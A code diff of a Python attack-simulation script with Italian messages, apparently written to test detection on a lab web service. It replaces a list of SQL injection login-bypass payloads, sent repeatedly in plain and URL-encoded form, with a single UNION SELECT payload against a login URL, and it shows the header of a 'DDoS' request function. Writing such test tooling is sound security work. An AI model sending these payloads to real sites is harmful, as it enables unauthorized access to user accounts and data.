@@ -44,37 +44,16 @@ def simulate_sql_injection():
     print("\nSimulazione SQL injection...")
     
     base_url = 'http://web:80/login'
-    sql_injection_payloads = [
-        "username=' OR '1'='1' --&password=any",
-        "username=admin' UNION SELECT * FROM users--&password=any",
-        "username=admin'--&password=any",
-        "username=' OR 1=1 #&password=any",
-        "username=admin' OR 1=1;--&password=any"
-    ]
+    payload = "username=' UNION SELECT * FROM users--&password=any"
     
-    # Invia ogni payload più volte per assicurarsi che venga rilevato
-    for payload in sql_injection_payloads:
-        for _ in range(3):  # Invia ogni payload 3 volte
-            try:
-                url = f'{base_url}?{payload}'
-                print(f"Tentativo SQL injection: {url}")
-                response = requests.get(url)
-                print(f"Status code: {response.status_code}")
-                # Aggiungi un piccolo delay tra le richieste
-                time.sleep(0.5)
-            except Exception as e:
-                print(f"Errore durante SQL injection: {e}")
-            
-            # Prova anche con URL encoding
-            try:
-                encoded_payload = urllib.parse.quote(payload)
-                url = f'{base_url}?{encoded_payload}'
-                print(f"Tentativo SQL injection (encoded): {url}")
-                response = requests.get(url)
-                print(f"Status code: {response.status_code}")
-                time.sleep(0.5)
-            except Exception as e:
-                print(f"Errore durante SQL injection (encoded): {e}")
+    try:
+        url = f'{base_url}?{payload}'
+        print(f"Tentativo SQL injection: {url}")
+        response = requests.get(url)
+        print(f"Status code: {response.status_code}")
+        time.sleep(1)
+    except Exception as e:
+        print(f"Errore durante SQL injection: {e}")
 
 def single_ddos_request(url):
     """Singola richiesta per il DDoS"""
